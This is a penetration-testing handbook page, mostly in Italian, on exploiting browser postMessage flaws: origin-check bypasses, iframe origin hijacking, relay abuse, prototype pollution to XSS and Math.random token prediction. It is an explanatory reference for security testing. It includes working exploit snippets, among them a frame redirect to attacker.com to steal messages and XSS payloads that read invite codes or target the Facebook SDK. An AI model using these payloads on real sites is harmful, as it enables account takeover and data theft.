# PostMessage Vulnerabilità

{{#include ../../banners/hacktricks-training.md}}

## Invio di **PostMessage**

**PostMessage** usa la seguente funzione per inviare un messaggio:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Attacking iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Sfruttamento di addEventListener

**`addEventListener`** è la funzione usata da JS per dichiarare la funzione che **si aspetta `postMessages`**.\
Verrà usato un codice simile al seguente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Nota in questo caso come la **prima cosa** che il codice fa sia **verificare l'origin**. Questo è estremamente **importante**, soprattutto se la pagina deve fare **qualcosa di sensibile** con le informazioni ricevute (per esempio cambiare una password). **Se non verifica l'origin, attackers possono obbligare victims a inviare dati arbitrari a questi endpoints** e cambiare le password delle victims (in questo esempio).

### Enumerazione

Per **trovare event listeners** nella pagina corrente puoi:

- **Cercare** nel codice JS `window.addEventListener` e `$(window).on` (_versione JQuery_)
- **Eseguire** nella console degli strumenti di sviluppo: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Andare su** _Elements --> Event Listeners_ negli strumenti di sviluppo del browser

![](<../../images/image (396).png>)

- Usare un'**estensione del browser** come [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Queste estensioni intercetteranno tutti i messaggi e te li mostreranno.

### Bypass del controllo dell'origin

- L'attributo **`event.isTrusted`** è considerato sicuro in quanto restituisce `True` solo per eventi generati da azioni genuine dell'utente. Sebbene sia difficile da bypassare se implementato correttamente, la sua importanza nei controlli di sicurezza è notevole.
- L'uso di **`indexOf()`** per la validazione dell'origin negli eventi postMessage può essere suscettibile a bypass. Un esempio che illustra questa vulnerabilità è:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Il metodo **`search()`** di `String.prototype.search()` è pensato per le regular expression, non per le stringhe. Passare qualcosa che non sia una regexp porta a una conversione implicita in regex, rendendo il metodo potenzialmente insicuro. Questo perché nella regex un punto (.) agisce come wildcard, permettendo il bypass della validazione con domini appositamente costruiti. Per esempio:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La funzione **`match()`**, similmente a `search()`, elabora regex. Se la regex è strutturata in modo inappropriato, potrebbe essere soggetta a bypass.
- La funzione **`escapeHtml`** è pensata per sanitizzare gli input escapando i caratteri. Tuttavia, non crea un nuovo oggetto escaped ma sovrascrive le proprietà dell'oggetto esistente. Questo comportamento può essere sfruttato. In particolare, se un oggetto può essere manipolato in modo che la sua proprietà controllata non riconosca `hasOwnProperty`, `escapeHtml` non si comporterà come previsto. Questo è dimostrato negli esempi seguenti:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Nell'ambito di questa vulnerabilità, l'oggetto `File` è particolarmente sfruttabile a causa della sua proprietà in sola lettura `name`. Questa proprietà, quando usata nei template, non viene sanitizzata da `escapeHtml`, causando potenziali rischi per la sicurezza.

- La proprietà `document.domain` in JavaScript può essere impostata da uno script per abbreviare il dominio, permettendo un'applicazione più permissiva della same-origin policy entro lo stesso dominio padre.

### Origin-only trust + trusted relays

Se un ricevente controlla solo **`event.origin`** (per esempio, si fida di qualsiasi `*.trusted.com`) spesso puoi trovare una **"relay" page su quell'origin che rispecchia parametri controllati dall'attacker via `postMessage`** verso un `targetOrigin`/`targetWindow` fornito. Esempi includono gadget di marketing/analytics che prendono query params e inoltrano `{msg_type, access_token, ...}` a `opener`/`parent`. Puoi:

- **Aprire** la victim page in un popup/iframe che abbia un `opener` così i suoi handler si registrano (molti pixels/SDKs collegano listener solo quando `window.opener` esiste).
- **Navigare** un'altra attacker window verso il relay endpoint sull'origin trusted, popolando i campi del messaggio che vuoi iniettare (message type, tokens, nonces).
- Poiché il messaggio ora proviene dall'origin trusted, la validazione basata solo sull'origin passa e puoi attivare comportamenti privilegiati (cambi di stato, chiamate API, scritture nel DOM) nel listener della victim.

Modelli di abuso riscontrati nel mondo reale:

- SDK di analytics (es. pixel/fbevents-style) consumano messaggi come `FACEBOOK_IWL_BOOTSTRAP`, poi **chiamano API backend usando un token fornito nel messaggio** e includono **`location.href` / `document.referrer`** nel body della richiesta. Se fornisci il tuo token, puoi **leggere queste richieste nella cronologia/log delle richieste del token** ed esfiltrare **OAuth codes/tokens** presenti nell'URL/referrer della victim page.
- Qualsiasi relay che rifletta campi arbitrari in `postMessage` ti permette di **spoofare message types** attesi da listener privilegiati. Combinato con una validazione degli input debole può portare a chiamate Graph/REST, sblocco di funzionalità, o flussi equivalenti a CSRF.

Suggerimenti per la ricerca: enumera i listener di `postMessage` che controllano solo `event.origin`, poi cerca **endpoint HTML/JS same-origin che inoltrano URL params via `postMessage`** (marketing previews, login popups, pagine di errore OAuth). Combina entrambi con `window.open()` + `postMessage` per bypassare i controlli sull'origin.

### Bypass e.origin == window.origin

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypass di e.source

È possibile verificare se il messaggio proviene dalla stessa window in cui lo script è in ascolto (particolarmente interessante per i Content Scripts from browser extensions per verificare se il messaggio è stato inviato dalla stessa pagina):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puoi forzare **`e.source`** di un messaggio a essere null creando un **iframe** che **invia** il **postMessage** e viene **immediatamente eliminato**.

Per maggiori informazioni **leggi:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Per eseguire questi attacchi, idealmente dovresti essere in grado di **put the victim web page** all'interno di un `iframe`. Ma alcuni header come `X-Frame-Header` possono **impedire** quel **comportamento**.\
In tali scenari puoi comunque usare un attacco meno stealthy. Puoi aprire una nuova scheda all'applicazione web vulnerabile e comunicare con essa:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Rubare il messaggio inviato al child bloccando la pagina principale

Nella pagina seguente puoi vedere come potresti rubare dei **dati sensibili inviati via postmessage** a un **child iframe** bloccando la **pagina principale** prima dell'invio e sfruttando una **XSS nel child** per **leak the data** prima che vengano ricevuti:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Rubare il messaggio modificando la location dell'iframe

Se puoi caricare in un iframe una pagina web senza X-Frame-Header che contiene un altro iframe, puoi **cambiare la location di quel child iframe**, quindi se sta ricevendo un **postmessage** inviato usando un **wildcard**, un attacker potrebbe **cambiare** l'**origin** di quell'iframe verso una pagina **controllata** da lui e **rubare** il messaggio:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage per Prototype Pollution e/o XSS

Nei casi in cui i dati inviati tramite `postMessage` vengano eseguiti da JS, puoi caricare la **pagina** in un **iframe** e **sfruttare** la **prototype pollution/XSS** inviando l'exploit tramite `postMessage`.

Un paio di **ottime spiegazioni di XSS tramite `postMessage`** si possono trovare in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Esempio di un exploit per abusare di **Prototype Pollution e poi XSS** tramite un `postMessage` verso un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Per **maggiori informazioni**:

- Link alla pagina su [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link alla pagina su [**XSS**](../xss-cross-site-scripting/index.html)
- Link alla pagina su [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predire i token di callback di **`Math.random()`** nei postMessage bridges

Quando la validazione dei messaggi usa un “shared secret” generato con `Math.random()` (es., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e lo stesso helper nomina anche gli iframe dei plugin, puoi recuperare gli output del PRNG e forgiare messaggi trusted:

- **Leak PRNG outputs via `window.name`:** Lo SDK assegna automaticamente nomi agli iframe dei plugin con `guid()`. Se controlli il top frame, inserisci la pagina vittima in un iframe, poi naviga l'iframe del plugin verso il tuo origin (es., `window.frames[0].frames[0].location='https://attacker.com'`) e leggi `window.frames[0].frames[0].name` per ottenere un output grezzo di `Math.random()`.
- **Force more outputs without reloads:** Alcuni SDK espongono un percorso di reinit; nell'FB SDK, lanciare `init:post` con `{xfbml:1}` forza `XFBML.parse()`, distrugge/ricrea l'iframe del plugin e genera nuovi nomi/ID di callback. Ripetute reinit producono tanti output PRNG quanto necessario (nota chiamate interne aggiuntive a `Math.random()` per callback/ID iframe, quindi i solver devono saltare i valori intermedi).
- **Trusted-origin delivery via parameter pollution:** Se un endpoint di un plugin first-party riflette un parametro non sanitizzato nel payload cross-window (es., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puoi iniettare `&type=...&iconSVG=...` preservando l'origin trusted `facebook.com`.
- **Predict the next callback:** Converti i nomi degli iframe leakati di nuovo in float in `[0,1)` e dai in input diversi valori (anche non consecutivi) a un predittore V8 di `Math.random` (es., basato su Z3). Genera il prossimo `guid()` localmente per forgiare il token di callback atteso.
- **Trigger the sink:** Costruisci i dati del postMessage in modo che il bridge invochi `xd.mpn.setupIconIframe` e inietti HTML in `iconSVG` (es., `<img src=x onerror=...>` codificato in URL), ottenendo DOM XSS all'interno dell'origin che ospita; da lì è possibile leggere iframe di same-origin (dialog OAuth, arbiters, ecc.).
- **Framing quirks help:** La catena richiede framing. In alcuni webview mobili, `X-Frame-Options` può degradare in `ALLOW-FROM` non supportato quando è presente `frame-ancestors`, e parametri “compat” possono forzare `frame-ancestors` permissivi, abilitando il side channel `window.name`.

#### Esempio minimo di messaggio contraffatto
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Riferimenti

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Per esercitarsi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
